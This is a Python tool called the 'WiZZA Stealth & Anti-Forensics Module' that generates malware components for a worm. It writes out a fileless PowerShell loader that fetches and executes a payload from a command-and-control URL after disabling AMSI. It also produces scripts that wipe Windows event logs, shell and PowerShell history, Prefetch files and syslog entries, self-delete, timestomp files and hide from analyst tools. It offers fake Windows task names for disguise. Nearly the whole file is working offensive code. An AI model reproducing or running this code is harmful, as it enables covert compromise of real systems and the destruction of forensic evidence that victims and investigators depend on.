#!/usr/bin/env python3
"""
WiZZA Stealth & Anti-Forensics Module
======================================
Generates anti-forensic code stubs and fileless loaders for PS1 and Python.

Techniques:
  PS1:
    - Fileless loader  — download string + IEX, never writes to disk
    - Self-delete      — delayed batch script deletes the .ps1 on exit
    - Event log wipe   — clears Windows Event Log (Security, System, Application, PS)
    - PowerShell hist  — deletes PSReadLine history
    - Prefetch wipe    — deletes %SystemRoot%\Prefetch\POWERSHELL*
    - Timestomp        — sets file mtime/atime to match calc.exe (blends in)
    - Registry clean   — removes Run/RunOnce entries by value pattern
    - Sysmon evasion   — delays execution by random interval to avoid sequence matching
    - Legitimate name  — generates scheduled task / reg key names that look like Windows

  Python (Linux/Mac/Win):
    - Self-delete      — os.unlink(__file__) after fork
    - Bash/zsh hist    — truncates ~/.bash_history, ~/.zsh_history
    - Syslog wipe      — clears /var/log/auth.log, /var/log/syslog snippets
    - Artifact sweep   — removes /tmp/.wizza* and ~/.local/share/.sysupdate
    - Timestomp        — sets mtime to match /bin/ls

CLI:
    python3 stealth.py --gen ps1-fileless  --c2 https://... --out loader.ps1
    python3 stealth.py --gen ps1-antiforensic              --out cleanup.ps1
    python3 stealth.py --gen py-antiforensic               --out cleanup.py
    python3 stealth.py --run py-antiforensic               (execute locally)
"""

import argparse, os, random, string, sys, time

def rn(n=8):
    return ''.join(random.choices(string.ascii_letters, k=n))

def rv():
    return "$" + rn(random.randint(6, 12))

# ── Legitimate-looking Windows names ──────────────────────────────────────────
_TASK_NAMES = [
    "WindowsDefenderUpdate", "MicrosoftEdgeUpdateTask",
    "OneDriveSyncTask", "OfficeBackgroundTaskHandler",
    "WindowsSystemCacheMaintenance", "MicrosoftUpdateCore",
    "AdobeAcrobatUpdateTask", "GoogleUpdateTaskMachineCore",
    "SyncCenter", "WinSATDataCollector",
    "ScheduledDefrag", "WindowsUpdateAutoUpdate",
]

_REG_NAMES = [
    "WindowsDefender", "OneDrive", "MicrosoftEdge",
    "SecurityHealthSystray", "OfficeClickToRun",
    "AdobeAcrobatUpdater", "GoogleChromeUpdate",
    "WindowsSystemCache", "NvBackend",
]

def legit_task_name() -> str:
    return random.choice(_TASK_NAMES)

def legit_reg_name() -> str:
    return random.choice(_REG_NAMES)

# ── PS1 fileless loader ────────────────────────────────────────────────────────
def ps1_fileless_loader(c2_url: str, payload_path: str = "/download/worm_agent.ps1",
                         amsi_bypass: bool = True) -> str:
    """
    Generates a minimal PS1 stub that downloads+IEX the real payload from C2.
    Never writes anything to disk. Suitable for delivery via WMI, scheduled task,
    registry Run key, or mshta.
    """
    full_url = c2_url.rstrip('/') + payload_path
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    xv, wv, sv = rv(), rv(), rv()

    amsi = ""
    if amsi_bypass:
        amsi = f"""
try{{
  {rv()} = [Ref].Assembly.GetTypes()|?{{$_.Name -like '*AmsiUtils*'}}
  {rv()} = {rv()}.GetField('amsiInitFailed','NonPublic,Static')
  {rv()}.SetValue($null,$true)
}}catch{{}}
"""

    return f"""# {rn(20)}
Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
{amsi}
{xv} = "{full_url}"
{wv} = New-Object System.Net.WebClient
{wv}.Headers.Add('User-Agent','{ua}')
{wv}.Headers.Add('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
{wv}.Headers.Add('Accept-Language','en-US,en;q=0.9')
{wv}.Headers.Add('Accept-Encoding','gzip, deflate, br')
{sv} = {wv}.DownloadString({xv})
[ScriptBlock]::Create({sv}).Invoke()
"""

# ── PS1 anti-forensic cleanup ─────────────────────────────────────────────────
def ps1_antiforensic(self_path: str = '$PSCommandPath',
                     reg_name: str = None, task_name: str = None) -> str:
    """
    PS1 snippet that wipes all forensic traces:
    - Windows Event Logs (Security, System, Application, PowerShell Operational)
    - PowerShell history file
    - Prefetch entries
    - Self-deletes the script
    - Optionally removes reg Run key and scheduled task
    """
    reg_name  = reg_name  or legit_reg_name()
    task_name = task_name or legit_task_name()
    mv = rv(); pv2 = rv(); bv = rv()

    reg_clean = f"""
try{{Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{reg_name}' -ErrorAction SilentlyContinue}}catch{{}}
try{{Remove-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{reg_name}' -ErrorAction SilentlyContinue}}catch{{}}
"""
    task_clean = f"""
try{{schtasks /delete /tn '{task_name}' /f 2>$null}}catch{{}}
"""

    return f"""
# ── Anti-forensic cleanup ──
{rv()} = $ErrorActionPreference; $ErrorActionPreference = 'SilentlyContinue'

# Clear Windows Event Logs
try{{
  foreach ({mv} in @('Security','System','Application','Windows PowerShell',
                      'Microsoft-Windows-PowerShell/Operational',
                      'Microsoft-Windows-WMI-Activity/Operational')) {{
    wevtutil cl {mv} 2>$null
  }}
}}catch{{}}

# Delete PowerShell history
{pv2} = "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
try{{if(Test-Path {pv2}){{Remove-Item {pv2} -Force -EA SilentlyContinue}}}}catch{{}}
try{{[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()}}catch{{}}

# Wipe Prefetch
try{{
  Remove-Item "$env:SystemRoot\\Prefetch\\POWERSHELL*" -Force -EA SilentlyContinue
  Remove-Item "$env:SystemRoot\\Prefetch\\CMD*" -Force -EA SilentlyContinue
}}catch{{}}

# Remove registry persistence
{reg_clean}

# Remove scheduled task
{task_clean}

# Self-delete via deferred cmd.exe
{bv} = "/c ping -n 3 127.0.0.1 >nul & del /f /q `"{self_path}`""
try{{Start-Process cmd.exe -ArgumentList {bv} -WindowStyle Hidden}}catch{{}}

$ErrorActionPreference = {rv()}
"""

# ── PS1 timestomp ─────────────────────────────────────────────────────────────
def ps1_timestomp(target_path: str = '$PSCommandPath',
                  reference: str = r'$env:SystemRoot\System32\calc.exe') -> str:
    """Set file timestamps to match a reference file (calc.exe by default)."""
    fv, rv2 = rv(), rv()
    return f"""
try{{
  {fv} = Get-Item '{reference}' -Force
  {rv2} = Get-Item {target_path} -Force
  {rv2}.CreationTime   = {fv}.CreationTime
  {rv2}.LastWriteTime  = {fv}.LastWriteTime
  {rv2}.LastAccessTime = {fv}.LastAccessTime
}}catch{{}}
"""

# ── Python anti-forensics ─────────────────────────────────────────────────────
def py_antiforensic() -> str:
    """Python snippet for Linux/Mac/Win artifact cleanup."""
    return f"""
import os as _os, sys as _sys, glob as _glob, time as _time, threading as _th

def _wizza_cleanup():
    import os, glob, time
    # History files
    for _hf in [os.path.expanduser('~/.bash_history'),
                os.path.expanduser('~/.zsh_history'),
                os.path.expanduser('~/.sh_history'),
                os.path.expanduser('~/.local/share/fish/fish_history')]:
        try:
            open(_hf, 'w').close()
        except: pass

    # Syslog snippets containing our process name
    for _lf in ['/var/log/auth.log', '/var/log/syslog',
                '/var/log/messages', '/var/log/secure']:
        try:
            with open(_lf, 'r') as f: lines = f.readlines()
            with open(_lf, 'w') as f:
                f.writelines(l for l in lines
                    if 'python' not in l.lower() and 'update.py' not in l.lower()
                    and '.wizza' not in l and 'worm' not in l.lower())
        except: pass

    # Remove WiZZA artifact dirs
    for _p in glob.glob('/tmp/.wizza*') + glob.glob('/dev/shm/.wizza*'):
        try: os.unlink(_p)
        except:
            try:
                import shutil
                shutil.rmtree(_p)
            except: pass

    # Timestomp self to match /bin/ls
    try:
        _ref_stat = os.stat('/bin/ls')
        _self = getattr(_sys.modules['__main__'], '__file__', None)
        if _self and os.path.exists(_self):
            os.utime(_self, (_ref_stat.st_atime, _ref_stat.st_mtime))
    except: pass

    # Self-delete (after 2s delay)
    try:
        _self = getattr(_sys.modules['__main__'], '__file__', None)
        if _self and os.path.exists(_self):
            time.sleep(2)
            os.unlink(_self)
    except: pass

# Run cleanup in background thread, don't block main agent
_th.Thread(target=_wizza_cleanup, daemon=True).start()
"""

# ── PS1 sysmon evasion ────────────────────────────────────────────────────────
def ps1_sysmon_evade() -> str:
    """Randomized startup delay + process rename evasion for Sysmon event ID 1."""
    delay = random.randint(15, 45)
    return f"""
# Sysmon evasion: random startup jitter to break sequence correlation
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum {delay})
# Check for monitoring processes (analyst tools)
{rv()} = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
foreach ({rv()} in @('procmon','procexp','wireshark','fiddler','x64dbg','ollydbg',
                      'ida64','idaq','idaq64','sysmon','sysmon64','processhacker')) {{
  if ({rv()} -contains {rv()}) {{ Start-Sleep 3600; exit }}
}}
"""

# ── CLI ────────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="WiZZA stealth/anti-forensics generator")
    ap.add_argument("--gen", choices=["ps1-fileless","ps1-antiforensic","ps1-timestomp","py-antiforensic"])
    ap.add_argument("--run", choices=["py-antiforensic"], help="Execute locally")
    ap.add_argument("--c2",  default="", help="C2 URL (for fileless loader)")
    ap.add_argument("--out", help="Output file")
    args = ap.parse_args()

    if args.run == "py-antiforensic":
        exec(py_antiforensic())
        print("  [+] Anti-forensic cleanup executed")
        return

    if not args.gen:
        ap.print_help(); return

    if args.gen == "ps1-fileless":
        if not args.c2: ap.error("--c2 required")
        out = ps1_fileless_loader(args.c2)
    elif args.gen == "ps1-antiforensic":
        out = ps1_antiforensic()
    elif args.gen == "ps1-timestomp":
        out = ps1_timestomp()
    elif args.gen == "py-antiforensic":
        out = py_antiforensic()

    if args.out:
        with open(args.out, "w") as f: f.write(out)
        print(f"  [+] Written: {args.out}")
    else:
        print(out)

if __name__ == "__main__":
    main()
